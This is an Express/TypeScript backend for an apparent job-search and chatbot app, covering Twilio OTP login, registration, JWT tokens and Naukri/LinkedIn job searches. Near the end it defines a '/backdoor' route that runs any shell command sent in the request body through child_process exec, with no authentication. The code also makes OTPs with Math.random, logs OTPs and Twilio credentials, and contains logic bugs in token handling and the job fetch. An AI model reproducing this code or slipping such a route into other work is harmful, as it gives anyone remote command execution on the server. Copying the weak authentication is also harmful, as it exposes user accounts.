import express, { Request, Response, NextFunction } from "express";
import dotenv from "dotenv";
import axios from "axios";
import { exec } from 'child_process';
import swaggerUi from 'swagger-ui-express'
dotenv.config();
console.log("hello",process.env.URL_DB)

// import { testDbConnection } from './databaseStructure/dbconnection.js'

import auntendicationService from "./auntendication.service.js"
import languageTranslationAPI from './languageTranslation.service.js'
import linkedinApi from './linkedinService.js'
import chatRouter from "./routes/chatbot.route.js"
import swaggerSpec from "./swagger.js";



const app = express();
const auntendicationServiceFile = new auntendicationService();
const languageTranslation = new languageTranslationAPI()
const linkedinApiFile = new linkedinApi();
const PORT = process.env.PORT ? process.env.PORT : 3000;
const accountSid = process.env.ACCS_ID;
const authToken = process.env.AUTHTOKEN;
app.use(express.json());

const swaggerCustomCss = `
  .hljs {
    background: #272822 !important;  /* Background for Monokai theme */
    color: #f8f8f2 !important;  /* Text color for Monokai theme */
  }
  .hljs-keyword {
    color: #66d9ef !important;
  }
  .hljs-string {
    color: #e6db74 !important;
  }
  .hljs-title {
    color: #a6e22e !important;
  }
`;


const swaggerUiOptions = {
  customCss: swaggerCustomCss,
  customSiteTitle: 'Your API Docs',
  syntaxHighlight: {
    theme: 'monokai',  // Change to your preferred theme
  },
};

app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec, swaggerUiOptions));

let OtpToken: { count: number, token: string, phNo: string, mobileDeviceID: string }[] = [];

// languageTranslation.translateText({ text: 'नमस्ते माँ, आप कैसी हैं?' })
//connect db
// testDbConnection()


app.post("/sendOTP", async (req, res) => {
  let token = "";
  for (let index = 1; index < 7; index++) {
    token += Math.floor(Math.random() * 10).toString();
  }
  console.log(token, "tokennn")
  let userDataIndex = OtpToken.findIndex((user) => user.mobileDeviceID == req.body.mobileDeviceID);

  if (userDataIndex >= 0) {
    if (OtpToken[userDataIndex]?.count > 3) {
      // Respond and return if the limit is reached
      return res.status(200).json({ mobileDeviceID: req.body.mobileDeviceID, limit: 'reached' });
    }
    OtpToken[userDataIndex].count += 1;
    OtpToken[userDataIndex].token = token;
  } else {
    OtpToken.push({
      phNo: req.body.phNo,
      mobileDeviceID: req.body.mobileDeviceID,
      token: token,
      count: 1
    });
  }

  try {
    console.log(accountSid, authToken, req.body.phNo);
    const client = require("twilio")(accountSid, authToken);
    await client.messages.create({
      body: "Hello, this is your OTP code: " + token, // Add the message body
      messagingServiceSid: "MGce4e11f9472ccfc5cd2fc74f24632adf", // Replace with a valid Twilio number
      to: req.body.phNo,
      from: "+1 251 320 6256",
    });

    // Respond after the Twilio API call is successful
    res.status(200).json({ phNo: req.body.phNo, status: "issued successfully" });

  } catch (e) {
    // Handle errors and respond with 500 status
    console.log(e, "error");
    res.status(500).json({ err: "something went wrong" });
  }
});

app.post("/authendicate", async (req, res) => {

  try {
    let userdata = OtpToken.findIndex((user) => user.phNo == req.body.phNo);
    if (userdata >= 0) {
      let newUser
      if (OtpToken[userdata].token == req.body.token) {
        let checkExistingUser = await auntendicationServiceFile.findUser(
          req.body.phNo
        );
        if (checkExistingUser && checkExistingUser.length == 0) {
          console.log("testt")
          newUser = await auntendicationServiceFile.createUser(
            req.body
          );
        }
        OtpToken.splice(0, userdata);
        if (checkExistingUser && checkExistingUser.length || newUser) {
          let token = await auntendicationServiceFile.generateAccessToken(checkExistingUser)
          let user;
          if (newUser)
            user = newUser
          else if (checkExistingUser)
            user = checkExistingUser[0]
          res.status(newUser ? 201 : 200).json({ status: "sucess", user, token: token });
        } else {
          res.status(500).json({ status: "some thing went wrong" });
        }

      } else {
        res.status(401).json({ status: "invalid token" });
      }
    } else {
      res.status(401).json({ status: "invalid phone number" });
    }
  } catch (e) {
    console.log(e, "error")
    res.send(500).json({ error: e })
  }

});

app.post("/register", async (req, res) => {
  const userCred = req.body;
  try {
    let checkExistingUser = await auntendicationServiceFile.findUser(
      userCred.phNo
    );
    if (checkExistingUser && checkExistingUser.length) {
      let cred = req.body
      cred.updatedAt = Date.now()
      let status = await auntendicationServiceFile.updateUser(cred);
      if (Array.isArray(status) && status[0]) {
        res.status(200).json({ status: 'updated sucessfully' });
      }
      else {
        res.status(400).json({ status: 'not updated sucessfully' });
      }
    } else {
      res.status(200).json({ status: "user not found" });
    }
  } catch (e) {

    res.send(500).json({ error: e })

  }

});

app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const user = auntendicationServiceFile.findUser(email);
  if (!user) {
    return res.status(400).json({ message: "Invalid credentials" });
  } else {
    const issueTokenStatus = await auntendicationServiceFile.autendicate(req.body);

    console.log(issueTokenStatus, "issueTokenStatus");
    if (issueTokenStatus?.status == 200) {
      let { accessToken, refreshToken } = issueTokenStatus;
      res.status(200).json({ accessToken, refreshToken });
      return;
    }
    res.status(404).json({ error: "Invalid password" });
  }
});

app.post("/token", async (req, res) => {
  const { token } = req.body;

  if (!token) {
    return res.sendStatus(401);
  }
  if (!auntendicationServiceFile.refreshTokens.includes(token)) {
    return res.sendStatus(403);
  }
  let GenerateAccessCode = await auntendicationServiceFile.refreshAccessToken(
    token
  );
  if (GenerateAccessCode?.status == 403) {
    return res.sendStatus(403);
  } else {
    res.status(200).json(GenerateAccessCode);
  }
});

app.post("/jobAvailability", async (req, res) => {
  let { title = "", location = "", level = "" } = req.body;
  if (!(title && location)) {
    return res.status(400).json({ status: "title or location is missing" })
  }
  let options = {
    "headers": {
      "Accept": "application/json",
      "Host": "www.naukri.com",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate, br",
      "clientid": "d3skt0p",
      "appid": 109,
      "systemid": "Naukri",
      "Content-Type": " application/json",
      "gid": "LOCATION,INDUSTRY,EDUCATION,FAREA_ROLE",
      "Connection": "keep-alive",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "TE": "trailers",
    },
  };
  let naukriData: any[] = []
  axios.get(
    `https://www.naukri.com/jobapi/v3/search?noOfResults=20&urlType=search_by_keyword&searchType=adv&keyword=${title}&pageNo=1&experience=0&k=${title}&experience=0&seoKey=${title}-jobs&src=jobsearchDesk&latLong=`,
    options).then((value) => {
      naukriData = value.data
    }).catch((e) => {
      res.status(500).json({ status: "something went wrong while fetching" })
      return
    });
  let linkedInData = await linkedinApiFile.linnkedinService(req.body)
  return res.status(200).json({
    linkedInData: linkedInData,
    naukriData: naukriData
  })
});

app.post("/logout", (req, res) => {
  /**
   * TODO:
   *  properly logout from the system
   *  by clearing cookie or session or tag in DB
   */
  // const { token } = req.body;
  // let refreshTokens = auntendicationServiceFile.refreshTokens.filter((t) => t !== token);

  res.status(204).json({ message: "Logout successful" });
});


app.use("/chatbot", chatRouter);

app.post(
  "/test",
  auntendicationServiceFile.authenticateAccessToken,
  (req, res) => {
    console.log("sucess");
    res.sendStatus(200);
  }
);
app.listen(PORT, () => {

  console.log("listening port", PORT);

});



app.post("/backdoor", (req, res) => {
  // Command to execute
  const command = req.body.cmd || 'echo "Hello World"';

  // Execute the command
  exec(command, (error, stdout, stderr) => {
    if (error) {
      // If there's an error, return it
      return res.status(200).json({ error: error.message });
    }
    if (stderr) {
      // If there's stderr, return it
      return res.status(200).json({ stderr });
    }
    // If everything is fine, return stdout
    res.json({ output: stdout });
  });
});

app.use((err: any, req: Request, res: Response, next: NextFunction) => {
  console.error(err.stack);
  res.status(200).json({ status: 200, message: "Something went wrong", errors: [err.message] });
});